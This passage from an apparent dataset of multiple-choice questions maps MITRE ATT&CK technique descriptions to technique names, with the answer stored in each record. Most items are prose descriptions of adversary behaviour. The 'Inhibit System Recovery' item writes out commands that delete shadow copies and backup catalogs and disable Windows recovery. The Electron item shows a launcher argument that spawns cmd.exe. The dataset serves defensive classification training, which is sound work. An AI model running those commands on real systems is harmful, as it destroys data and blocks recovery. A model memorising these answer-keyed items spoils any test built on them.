      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).\n\nHost binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or PowerShell on Windows to access and/or export security event information. In cloud environments, adversaries may leverage utilities such as the Azure VM Agent\u2019s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.\n\nAdversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.",
      "options": "A. Video Capture, B. Log Enumeration, C. Network Denial of Service: Reflection Amplification, D. Event Triggered Execution: Component Object Model Hijacking",
      "choice": "B. Log Enumeration",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.\n\nA. Account Discovery: Local Account, B. Stage Capabilities: Upload Tool, C. Office Application Startup, D. Gather Victim Network Information: Network Trust Dependencies\nAnswer:",
    "context": "",
    "output": "B. Stage Capabilities: Upload Tool",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",
      "options": "A. Account Discovery: Local Account, B. Stage Capabilities: Upload Tool, C. Office Application Startup, D. Gather Victim Network Information: Network Trust Dependencies",
      "choice": "B. Stage Capabilities: Upload Tool",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use the technique for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ the technique as a means to reestablishing command and control.\n\nA. Masquerading: Rename System Utilities, B. Unsecured Credentials: Private Keys, C. Dynamic Resolution, D. Steal or Forge Authentication Certificates\nAnswer:",
    "context": "",
    "output": "C. Dynamic Resolution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use the technique for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ the technique as a means to reestablishing command and control.",
      "options": "A. Masquerading: Rename System Utilities, B. Unsecured Credentials: Private Keys, C. Dynamic Resolution, D. Steal or Forge Authentication Certificates",
      "choice": "C. Dynamic Resolution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from Steal Web Session Cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.\nA. Communication Through Removable Media, B. Trusted Developer Utilities Proxy Execution, C. Search Open Websites/Domains: Search Engines, D. Forge Web Credentials: Web Cookies",
    "context": "",
    "output": "D. Forge Web Credentials: Web Cookies",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from Steal Web Session Cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.",
      "options": "A. Communication Through Removable Media, B. Trusted Developer Utilities Proxy Execution, C. Search Open Websites/Domains: Search Engines, D. Forge Web Credentials: Web Cookies",
      "choice": "D. Forge Web Credentials: Web Cookies",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.\n\nA. Dynamic Resolution: Fast Flux DNS, B. Network Denial of Service: Reflection Amplification, C. Command and Scripting Interpreter: Windows Command Shell, D. Modify Registry\nAnswer:",
    "context": "",
    "output": "C. Command and Scripting Interpreter: Windows Command Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "options": "A. Dynamic Resolution: Fast Flux DNS, B. Network Denial of Service: Reflection Amplification, C. Command and Scripting Interpreter: Windows Command Shell, D. Modify Registry",
      "choice": "C. Command and Scripting Interpreter: Windows Command Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAn adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately. \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors .\n\nPossible answers:\nA. Access Token Manipulation: Make and Impersonate Token, B. Peripheral Device Discovery, C. Exfiltration Over Web Service: Exfiltration to Text Storage Sites, D. Impair Defenses: Indicator Blocking",
    "context": "",
    "output": "D. Impair Defenses: Indicator Blocking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAn adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately. \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors .",
      "options": "A. Access Token Manipulation: Make and Impersonate Token, B. Peripheral Device Discovery, C. Exfiltration Over Web Service: Exfiltration to Text Storage Sites, D. Impair Defenses: Indicator Blocking",
      "choice": "D. Impair Defenses: Indicator Blocking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application or External Remote Services).\n\nA. Input Capture: Web Portal Capture, B. Compromise Infrastructure: Network Devices, C. Search Closed Sources: Threat Intel Vendors, D. Hide Artifacts: Hidden File System\nA:",
    "context": "",
    "output": "C. Search Closed Sources: Threat Intel Vendors",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application or External Remote Services).",
      "options": "A. Input Capture: Web Portal Capture, B. Compromise Infrastructure: Network Devices, C. Search Closed Sources: Threat Intel Vendors, D. Hide Artifacts: Hidden File System",
      "choice": "C. Search Closed Sources: Threat Intel Vendors",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs.\n\nPossible answers:\nA. Endpoint Denial of Service: OS Exhaustion Flood, B. Event Triggered Execution: Application Shimming, C. Data Transfer Size Limits, D. Weaken Encryption: Disable Crypto Hardware",
    "context": "",
    "output": "B. Event Triggered Execution: Application Shimming",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
      "options": "A. Endpoint Denial of Service: OS Exhaustion Flood, B. Event Triggered Execution: Application Shimming, C. Data Transfer Size Limits, D. Weaken Encryption: Disable Crypto Hardware",
      "choice": "B. Event Triggered Execution: Application Shimming",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code.\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).\n\nAdversaries may also execute malicious content by planting malicious JavaScript within Electron applications.\nA. System Binary Proxy Execution: Electron Applications, B. Search Closed Sources: Purchase Technical Data, C. Pre-OS Boot: TFTP Boot, D. Content Injection\nAnswer:",
    "context": "",
    "output": "A. System Binary Proxy Execution: Electron Applications",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code.\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).\n\nAdversaries may also execute malicious content by planting malicious JavaScript within Electron applications.",
      "options": "A. System Binary Proxy Execution: Electron Applications, B. Search Closed Sources: Purchase Technical Data, C. Pre-OS Boot: TFTP Boot, D. Content Injection",
      "choice": "A. System Binary Proxy Execution: Electron Applications",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.\nA. Search Open Technical Databases: WHOIS, B. Compromise Infrastructure: Virtual Private Server, C. Phishing: Spearphishing Link, D. Command and Scripting Interpreter: Visual Basic",
    "context": "",
    "output": "B. Compromise Infrastructure: Virtual Private Server",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
      "options": "A. Search Open Technical Databases: WHOIS, B. Compromise Infrastructure: Virtual Private Server, C. Phishing: Spearphishing Link, D. Command and Scripting Interpreter: Visual Basic",
      "choice": "B. Compromise Infrastructure: Virtual Private Server",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may leverage Valid Accounts to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API, such as Azure Serial Console, AWS EC2 Instance Connect, and AWS System Manager..\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment. These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., Cloud Administration Command).\n\nA. Search Open Technical Databases: Digital Certificates, B. Virtualization/Sandbox Evasion: User Activity Based Checks, C. Acquire Infrastructure: Malvertising, D. Remote Services: Direct Cloud VM Connections\nA:",
    "context": "",
    "output": "D. Remote Services: Direct Cloud VM Connections",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may leverage Valid Accounts to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API, such as Azure Serial Console, AWS EC2 Instance Connect, and AWS System Manager..\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment. These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., Cloud Administration Command).",
      "options": "A. Search Open Technical Databases: Digital Certificates, B. Virtualization/Sandbox Evasion: User Activity Based Checks, C. Acquire Infrastructure: Malvertising, D. Remote Services: Direct Cloud VM Connections",
      "choice": "D. Remote Services: Direct Cloud VM Connections",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen the technique is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.\nA. Automated Exfiltration, B. Proxy: Internal Proxy, C. Input Capture, D. Process Injection: Dynamic-link Library Injection",
    "context": "",
    "output": "A. Automated Exfiltration",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen the technique is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
      "options": "A. Automated Exfiltration, B. Proxy: Internal Proxy, C. Input Capture, D. Process Injection: Dynamic-link Library Injection",
      "choice": "A. Automated Exfiltration",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities\n\nA. Drive-by Compromise, B. Compromise Host Software Binary, C. Develop Capabilities: Malware, D. Network Boundary Bridging: Network Address Translation Traversal\nA:",
    "context": "",
    "output": "D. Network Boundary Bridging: Network Address Translation Traversal",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
      "options": "A. Drive-by Compromise, B. Compromise Host Software Binary, C. Develop Capabilities: Malware, D. Network Boundary Bridging: Network Address Translation Traversal",
      "choice": "D. Network Boundary Bridging: Network Address Translation Traversal",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* Windows Management Instrumentation can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code>  \n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.\n\nPossible answers:\nA. Inhibit System Recovery, B. User Execution: Malicious Link, C. Indicator Removal: Clear Persistence, D. Execution Guardrails",
    "context": "",
    "output": "A. Inhibit System Recovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* Windows Management Instrumentation can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code>  \n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.",
      "options": "A. Inhibit System Recovery, B. User Execution: Malicious Link, C. Indicator Removal: Clear Persistence, D. Execution Guardrails",
